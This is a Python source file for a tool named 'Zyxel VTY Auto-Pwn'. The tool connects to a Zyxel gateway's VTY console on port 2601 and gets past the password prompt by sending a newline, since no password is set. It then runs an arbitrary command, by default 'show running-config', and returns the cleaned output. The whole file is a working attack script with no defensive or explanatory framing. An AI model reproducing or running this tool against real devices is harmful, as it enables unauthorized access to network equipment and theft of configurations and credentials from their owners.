"""
Zyxel VTY Auto-Pwn - Robust passwordless VTY exploitation tool.
Handles the finicky handshake: reads banner, sends newline to activate shell,
then executes commands with proper timing for full output capture.
"""
import socket
import time
import re

def zyxel_vty_auto_pwn(target: str, port: int = 2601, command: str = "show running-config", timeout: int = 20) -> str:
    """
    Connect to a Zyxel VTY console with no password, execute a command,
    and return the full output. Handles the tricky handshake.
    
    Args:
        target: IP address of the target gateway
        port: VTY console port (default: 2601)
        command: Command to execute (default: show running-config)
        timeout: Overall timeout in seconds
        
    Returns:
        String containing full session output
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    
    try:
        sock.connect((target, port))
        
        # Phase 1: Read the initial banner
        time.sleep(0.5)
        banner = b""
        try:
            while True:
                sock.settimeout(0.5)
                chunk = sock.recv(4096)
                if not chunk:
                    break
                banner += chunk
                if b"password" in chunk.lower() or b"Vty" in chunk:
                    break
        except socket.timeout:
            pass
        
        banner_text = banner.decode("utf-8", errors="replace").strip()
        
        # Phase 2: Send newline to get past password prompt (password is not set)
        time.sleep(0.3)
        sock.sendall(b"\r\n")
        
        # Wait for the prompt to appear
        prompt_data = b""
        try:
            sock.settimeout(2.0)
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                prompt_data += chunk
                decoded = prompt_data.decode("utf-8", errors="replace")
                # Look for any prompt character
                if re.search(r'[>#$]', decoded):
                    break
        except socket.timeout:
            pass
        
        # Phase 3: Send the actual command
        time.sleep(0.5)
        sock.sendall((command + "\r\n").encode())
        
        # Phase 4: Read all output until prompt returns
        output = b""
        try:
            sock.settimeout(2.0)
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                output += chunk
        except socket.timeout:
            pass
        
        # Phase 5: Try to read any additional output
        time.sleep(0.3)
        try:
            sock.settimeout(1.0)
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                output += chunk
        except socket.timeout:
            pass
        
        # Clean up the output
        full_output = output.decode("utf-8", errors="replace")
        # Remove escape sequences and control chars
        clean_output = re.sub(r'\x1b\[[0-9;]*[a-zA-Z]', '', full_output)
        clean_output = re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]', '', clean_output)
        
        result = f"[BANNER] {banner_text}\n"
        if clean_output.strip():
            result += f"[OUTPUT]\n{clean_output.strip()}"
        else:
            result += "[OUTPUT] (empty - command produced no output)"
        
        return result
        
    except socket.timeout:
        return f"Error: Connection timed out to {target}:{port}"
    except ConnectionRefusedError:
        return f"Error: Connection refused to {target}:{port}"
    except ConnectionResetError as e:
        return f"Error: Connection reset - {e}. The VTY may need a different handshake sequence."
    except Exception as e:
        return f"Error: {str(e)}"
    finally:
        try:
            sock.close()
        except:
            pass
